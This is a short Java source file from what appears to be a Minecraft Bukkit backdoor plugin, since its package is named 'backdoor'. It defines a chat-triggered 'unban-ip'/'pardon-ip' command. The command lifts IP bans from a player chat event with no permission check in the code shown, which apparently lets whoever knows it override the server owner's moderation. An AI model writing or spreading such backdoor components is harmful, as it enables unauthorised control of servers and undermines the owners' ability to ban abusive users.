package me.tsb.backdoor.commands.bans;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "unBan-Ip", aliases = {"unban-ip", "pardon-ip"})
public class UnBanIpCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            if (Bukkit.getBanList(BanList.Type.IP).isBanned(args.get(0))) {
                Bukkit.getBanList(BanList.Type.IP).pardon(args.get(0));
            } else event.getPlayer().sendMessage(ChatColor.RED + "This person is not banned!\nDid you use the IP?");
        }
    }
}
